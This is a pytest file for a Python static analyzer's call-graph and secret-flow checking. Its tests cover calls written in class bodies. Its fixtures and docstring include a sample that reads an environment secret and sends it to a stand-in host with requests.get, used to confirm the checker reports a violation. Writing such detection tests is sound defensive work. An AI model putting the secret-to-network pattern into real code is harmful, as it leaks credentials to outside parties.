# SPDX-License-Identifier: AGPL-3.0-or-later
"""A call in a class body outside every method emits a calls edge (WI-muzav-nugak).

INV-foluz: every call site an analyzer parses emits a calls edge anchored on
SOME symbol. ``py.py`` walked module code under ``<module>`` and each function
body under its own symbol, and for a ``ClassDef`` it processed only the
decorators. A statement in the class body itself -- ``field =
models.CharField(...)``, ``k = os.environ["K"]``, ``requests.get(...)`` -- runs
when the class is defined, and emitted nothing: no calls edge, no
``module_attr_ref``. verify-claims then read

    class C:
        k = os.environ["K"]
        requests.get("http://x/" + k)

as ``confirmed`` with no evidence, a false all-clear, while the same two lines
at module level read ``violated``.

The class body is anchored on the class's own symbol (the innermost class), as
Java's static initializer is (INV-bamij).
"""
from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
from typing import Any

import pytest

from hypergumbo_core.cli import main
from hypergumbo_lang_mainstream.py import analyze_python


def _calls_from(repo: Path, src_fragment: str) -> list[str]:
    """The dst of every calls edge whose src is the symbol named ``src_fragment``."""
    result = analyze_python(repo)
    by_id = {s.id: s for s in result.symbols}
    return sorted(
        e.dst for e in result.edges
        if e.edge_type == "calls"
        and by_id.get(e.src) is not None
        and by_id[e.src].name == src_fragment
    )


def test_a_class_body_call_is_anchored_on_the_class(tmp_path: Path) -> None:
    """The filed survey: two class-body calls and no calls edge at all."""
    (tmp_path / "app.py").write_text(
        "import os, subprocess\n"
        "class C:\n"
        "    subprocess.run(['echo', os.environ['K']])\n"
        "    x = len('a')\n"
    )
    dsts = _calls_from(tmp_path, "C")
    assert any(":run:" in d for d in dsts), dsts
    assert any(":len:" in d for d in dsts), dsts


def test_a_nested_class_body_call_is_anchored_on_the_innermost_class(
    tmp_path: Path,
) -> None:
    """A Django ``Meta`` inside a model: its call belongs to ``Meta``, not to
    the model, and each class body is processed once."""
    (tmp_path / "app.py").write_text(
        "def helper():\n"
        "    return 1\n"
        "class Model:\n"
        "    a = helper()\n"
        "    class Meta:\n"
        "        b = helper()\n"
    )
    result = analyze_python(tmp_path)
    by_id = {s.id: s for s in result.symbols}
    anchored = sorted(
        (by_id[e.src].name, e.line) for e in result.edges
        if e.edge_type == "calls" and e.dst.endswith(":helper:function")
    )
    assert anchored == [("Meta", 6), ("Model", 4)]


def test_a_method_call_stays_on_the_method(tmp_path: Path) -> None:
    """The class body excludes its ``def`` statements: a call inside a method
    is the method's, never also the class's."""
    (tmp_path / "app.py").write_text(
        "def helper():\n"
        "    return 1\n"
        "class C:\n"
        "    def m(self):\n"
        "        return helper()\n"
    )
    assert _calls_from(tmp_path, "C") == []
    assert any(":helper:" in d for d in _calls_from(tmp_path, "C.m"))


def test_a_class_in_a_function_sees_the_function_s_nested_helpers(
    tmp_path: Path,
) -> None:
    """A class body inside a function resolves a bare name through the
    enclosing function's scope, as Python does."""
    (tmp_path / "app.py").write_text(
        "def outer():\n"
        "    def inner():\n"
        "        return 1\n"
        "    class C:\n"
        "        x = inner()\n"
        "    return C\n"
    )
    result = analyze_python(tmp_path)
    by_id = {s.id: s for s in result.symbols}
    inner = [s for s in result.symbols if s.name.endswith("inner")]
    assert len(inner) == 1
    assert [
        e.dst for e in result.edges
        if e.edge_type == "calls" and by_id[e.src].kind == "class"
    ] == [inner[0].id]


_CLAIMS = '''claims:
  - id: SECRET-NET
    text: Secrets never reach the network.
    constraint:
      taint_flow:
        source_taint: host_secret
        prohibited_sink_zone: network
'''


def _verdict(tmp_path: Path, source: str) -> dict[str, Any]:
    """Run the shipped CLI and return the SECRET-NET verdict."""
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "app.py").write_text(source)
    claims = tmp_path / "claims.yaml"
    claims.write_text(_CLAIMS)
    mp = pytest.MonkeyPatch()
    mp.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    buf = io.StringIO()
    try:
        with contextlib.redirect_stdout(buf), \
                contextlib.redirect_stderr(io.StringIO()):
            main(["verify-claims", str(repo), "--claims", str(claims),
                  "--format", "json"])
    finally:
        mp.undo()
    verdicts = {v["claim_id"]: v for v in json.loads(buf.getvalue())["verdicts"]}
    return verdicts["SECRET-NET"]


def test_a_class_body_flow_to_the_network_is_violated(tmp_path: Path) -> None:
    """The filed repro. It read ``confirmed`` with no evidence."""
    verdict = _verdict(tmp_path, (
        "import os\n"
        "import requests\n"
        "class C:\n"
        "    k = os.environ['K']\n"
        "    requests.get('http://x/' + k)\n"
    ))
    assert verdict["verdict"] == "violated"
    assert verdict["evidence"]
